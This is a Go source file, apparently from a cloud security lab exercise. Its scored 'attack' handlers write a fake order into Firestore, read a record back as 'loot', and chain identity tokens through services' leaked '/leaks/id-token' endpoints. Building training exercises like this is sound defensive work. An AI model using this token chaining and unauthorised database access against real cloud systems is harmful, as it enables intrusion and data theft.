package main

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/HayoVanLoon/go-commons/logjson"
	"google.golang.org/api/iterator"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
)

type Loot struct {
	Key  string `json:"key"`
	Data string `json:"data"`
}

type AttackResult struct {
	Points      int    `json:"points"`
	Explanation string `json:"explanation"`
	Loot        []Loot `json:"loot"`
	Log         string `json:"log"`
}

func addAttacks() {
	http.HandleFunc("/attacks/1", writeFirestore)
	http.HandleFunc("/attacks/2", readFirestore)
	http.HandleFunc("/attacks", listAttacks)
}

func listAttacks(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.WriteHeader(http.StatusMethodNotAllowed)
		w.Header().Set("allow", "GET")
		return
	}
	_, _ = w.Write([]byte("1,2"))
}

func OkAttack(w http.ResponseWriter, r *http.Request, result *AttackResult) {
	logjson.Info(fmt.Sprintf("[attack] %s successful", r.URL.Path))
	OkJson(w, result)
}

func OkFail(w http.ResponseWriter, r *http.Request, result *AttackResult, msg string) {
	if msg == "" {
		result.Log = "attack failed"
	} else {
		result.Log = msg
	}
	logjson.Info(fmt.Sprintf("[attack] %s failed", r.URL.Path))
	OkJson(w, result)
}

func GetChainedToken(services []string, target string) (string, error) {
	if len(services) == 0 {
		return "", nil
	}
	idToken := ""
	for i := 0; i < len(services)-1; i += 1 {
		tgt := fmt.Sprintf("%s/leaks/id-token", services[i+1])
		var err error
		idToken, err = GetServiceIdToken(services[i], tgt, idToken)
		if err != nil {
			return "", fmt.Errorf("could not get token from %s for %s: %s", services[i], tgt, err)
		}
	}
	last := services[len(services)-1]
	return GetServiceIdToken(last, target, idToken)
}

func GetServiceIdToken(service, target, token string) (string, error) {
	url := service + "/leaks/id-token?url=" + target
	resp, err := GetWithAuth(url, token)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("unexpected return code calling %s: %v", url, resp.StatusCode)
	}
	idToken, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(idToken), nil
}

func writeFirestore(w http.ResponseWriter, r *http.Request) {
	defer LogPanic()
	log.Printf("starting %s for %s", r.URL.Path, getIp(r))
	result := &AttackResult{
		Explanation: "number-service updates firestore",
	}

	client, err := GetFirestore()
	if err != nil {
		logjson.Error(fmt.Sprintf("could not create firestore client: %s", err))
		OkFail(w, r, result, "error in exercise code or setup")
		return
	}

	o := Order{
		Customer:    "hacker-" + getIp(r),
		Name:        "loot",
		Quantity:    1234567890,
		OrderNumber: 666,
	}
	d := client.Collection(baseCollection + "/orders").Doc(strconv.Itoa(o.OrderNumber))
	_, err = d.Create(context.Background(), o)
	if err == nil {
		result.Points = 1000
		OkAttack(w, r, result)
	} else {
		OkFail(w, r, result, "")
	}
}

func readFirestore(w http.ResponseWriter, r *http.Request) {
	defer LogPanic()
	log.Printf("starting %s for %s", r.URL.Path, getIp(r))
	result := &AttackResult{
		Explanation: "number-service reads firestore",
	}

	client, err := GetFirestore()
	if err != nil {
		logjson.Error(fmt.Sprintf("[attack] could not create firestore client: %s", err))
		OkFail(w, r, result, "error in exercise code or setup")
		return
	}

	q := client.Collection(baseCollection + "/orders").Limit(1)
	di := q.Documents(context.Background())
	d, err := di.Next()
	if err != nil && err == iterator.Done {
		OkFail(w, r, result, "")
		return
	}
	if d != nil {
		loot, err := json.Marshal(d.Data())
		if err == nil {
			result.Loot = append(result.Loot, Loot{"firestore record", string(loot)})
		}
	}
	result.Points = 100
	OkAttack(w, r, result)
}
